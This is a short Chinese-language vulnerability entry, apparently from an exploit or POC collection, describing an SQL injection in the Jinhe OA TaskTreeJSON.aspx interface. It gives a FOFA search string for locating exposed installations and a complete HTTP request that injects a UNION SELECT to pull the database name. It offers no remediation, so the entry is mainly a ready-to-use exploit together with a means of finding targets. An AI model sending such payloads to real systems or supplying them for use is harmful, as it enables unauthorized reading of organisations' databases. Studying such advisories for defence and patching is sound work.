## 金和OA TaskTreeJSON.aspx SQL注入漏洞

## 漏洞描述
金和OA `TaskTreeJSON.aspx` 接口对输入参数未过滤，导致 SQL 注入，攻击者可读取数据库信息。

## 网络空间测绘
```
fofa: app="金和网络-金和OA"
```

## POC
```
GET /C6/3HSoft.Web.DailyTaskManage/TaskTreeJSON.aspx?id=1%27+union+all+select+null%2C%27%27%2C(select+db_name())--+ HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
```

## 参考
- 社区情报

